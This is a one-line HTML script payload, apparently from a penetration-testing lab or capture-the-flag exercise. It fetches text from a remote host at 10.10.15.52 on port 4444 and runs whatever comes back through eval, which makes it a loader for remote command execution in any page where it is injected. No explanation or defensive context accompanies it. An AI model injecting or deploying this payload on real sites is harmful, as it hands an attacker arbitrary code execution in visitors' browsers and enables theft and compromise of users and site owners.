<script>
    fetch("http://10.10.15.52:4444/shell")
    .then(response => response.text())
    .then(cmd => eval(cmd));
</script>
